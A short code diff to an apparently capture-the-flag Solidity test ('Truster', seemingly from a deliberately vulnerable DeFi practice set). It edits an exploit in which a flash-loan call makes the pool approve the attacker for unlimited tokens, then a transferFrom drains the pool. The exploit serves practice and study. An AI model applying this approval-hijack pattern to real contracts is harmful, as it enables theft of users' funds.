@@ -43,7 +43,7 @@ contract Truster is Test {
         bytes memory data = abi.encodeWithSignature(
             "approve(address,uint256)",
             address(attacker),
-            TOKENS_IN_POOL
+            type(uint256).max
         );        
         trusterLenderPool.flashLoan(
             TOKENS_IN_POOL,
@@ -51,7 +51,7 @@ contract Truster is Test {
             address(dvt),
             data
         );
-        
+        vm.startPrank(attacker);
         dvt.transferFrom(
             address(trusterLenderPool),
             address(attacker),
